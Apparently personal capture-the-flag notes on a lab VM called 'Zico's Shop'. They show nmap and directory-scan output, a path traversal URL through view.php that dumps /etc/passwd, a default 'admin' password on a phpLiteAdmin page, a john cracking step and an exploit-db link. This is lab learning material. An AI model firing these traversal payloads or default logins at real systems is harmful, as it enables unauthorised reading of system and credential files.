# ports


```bash
Open 192.168.178.74:22                                                                                                                                                                                            
Open 192.168.178.74:80                                                                                                                                                                                            
Open 192.168.178.74:111                                                                                                                                                                                           
Open 192.168.178.74:41438 


ORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJwR6q4VerUDe7bLXRL6ZPTXj5FY66he+WWlRSoQppwDLqrTG73Pa9qUHMDFb1LXN1qgg0p0lyfqvm8ZeN+98rbT0JW6+Wqa7v0K+N82xf87fVkJcXAuU/A8OGR9eVMZmWsIOpabZexd5CHYgLO3k4YpPSdxc6S4zJcOGwXVnmGHAAAAFQDHjsPg0rmkbquTJRdlEZBVJe9+3QAAAIBjYIAiGvKhmJfzDjVfzlxRD1ET7ZhSoMDxU0KadwXQP1uBdlYVEteJQpUTEsA+7kFH7xhtZ/zbK2afEFHriAphTJmz8GqkIR5CJXh3dZspdk2MHCgxkXl5G/iVPLR9UShN+nsAVxfm0gffCqbqZu3Ridt3JwTXQbiDfXO/a6T/eQAAAIEAlsW/i/dUuFbRVO2zaAKwL/CFWT19Al7+njszC5FCJ2deggmF/NIKJUbJwkRZkwL4PY1HYj2xqn7ImhPSyvdCd+IFdw73Pndnjv0luDc8i/a4JUEfna4rzXt1Y5c24J1pEoKA05VicyCBD2z6TodRJEVEFSsa1s8s2p9x6LxwsDw=
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZt46W9slSN3Y6D2f931rijUPCEewhQWmBfGhybuF4qLftfJMuyFcREZkG6UretVI8ZnQn/OMDgbf2DYMzKsRLnz7W5cGy1Mt1pWoG0iCgi2xHzLqOqPYo4mP9/hdZT6pANXapETT55yx8sHAYLAa9NK5Dtyv+QNQ2dUUb1wUTCqgYffLVDgoHvNNDwCwB6biJf6uopqfg2KXvAzcqSa6oaRChJOXjFlM08HebMwkMSzrOXjWbXhFsONy5JuDf3WztCtLMsFrVRHTdDwTh7uL2UQ8Qcky+kP6Wd7G8NlW5RxubYIFpAM0u2SsQIjYOxz+eOfQ8GE3WjvaIBqX05gat
|   256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFxsiWE3WImfJcjiWS5asOVoMsn+0gFLU5AgPNs2ATokB7kw00IsB0YGrqClwYNauRRddkYMsi0icJSR60mYNSo=
80/tcp    open  http    syn-ack Apache httpd 2.2.22 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Zico's Shop
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36673/udp6  status
|   100024  1          41438/tcp   status
|   100024  1          46067/udp   status
|_  100024  1          51268/tcp6  status
41438/tcp open  status  syn-ack 1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:40
Completed NSE at 16:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:40
Completed NSE at 16:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:40
Completed NSE at 16:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.67 seconds

````




Path Traversal is possible


http://192.168.56.101/view.php?page=../../../../../../etc/passwd

users

```bash

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh syslog:x:101:103::/home/syslog:/bin/false messagebus:x:102:105::/var/run/dbus:/bin/false ntp:x:103:108::/home/ntp:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin vboxadd:x:999:1::/var/run/vboxadd:/bin/false statd:x:105:65534::/var/lib/nfs:/bin/false mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false zico:x:1000:1000:,,,:/home/zico:/bin/bash

```

Apache Root Dir:

http://192.168.56.101/view.php?page=../../../../../../var/www/index.html

dir scan

``` bash
301        9l       28w      314c http://192.168.178.74/img
200       22l      172w     1094c http://192.168.178.74/LICENSE
200      185l      399w     8355c http://192.168.178.74/tools
200      185l      399w     8355c http://192.168.178.74/tools.html
200        0l        0w        0c http://192.168.178.74/view
200        0l        0w        0c http://192.168.178.74/view.php
301        9l       28w      313c http://192.168.178.74/js
200      183l      561w     7970c http://192.168.178.74/index
200      183l      561w     7970c http://192.168.178.74/index.html
200      183l      561w     7970c http://192.168.178.74/
301        9l       28w      314c http://192.168.178.74/css
200      834l     2976w   125976c http://192.168.178.74/img/header
200       15l       66w     1107c http://192.168.178.74/img/
301        9l       28w      324c http://192.168.178.74/img/portfolio
200       15l       68w     1131c http://192.168.178.74/img/portfolio/
200       15l       64w     1119c http://192.168.178.74/css/
301        9l       28w      318c http://192.168.178.74/dbadmin
301        9l       28w      317c http://192.168.178.74/vendor
200       29l       54w      789c http://192.168.178.74/package
301        9l       28w      335c http://192.168.178.74/img/portfolio/thumbnails
200       15l       66w     1119c http://192.168.178.74/js/
200      223l     1181w    63788c http://192.168.178.74/img/portfolio/thumbnails/1
200      187l      959w    48101c http://192.168.178.74/img/portfolio/thumbnails/2
200      181l      939w    48228c http://192.168.178.74/img/portfolio/thumbnails/3
200      264l     1343w    62334c http://192.168.178.74/img/portfolio/thumbnails/5
200       19l      106w     1907c http://192.168.178.74/img/portfolio/thumbnails/
200      228l     1065w    49055c http://192.168.178.74/img/portfolio/thumbnails/4
200      197l     1086w    53428c http://192.168.178.74/img/portfolio/thumbnails/6
200       18l      101w     1732c http://192.168.178.74/vendor/
301        9l       28w      333c http://192.168.178.74/img/portfolio/fullsize
```




DBAdmin Light

http://192.168.56.101/dbadmin/test_db.php

password = admin

![[Pasted image 20210531232654.png]]

crack PW with john:

![[Pasted image 20210531233101.png]]


found exploit for phpAdminLight

https://www.exploit-db.com/exploits/24044

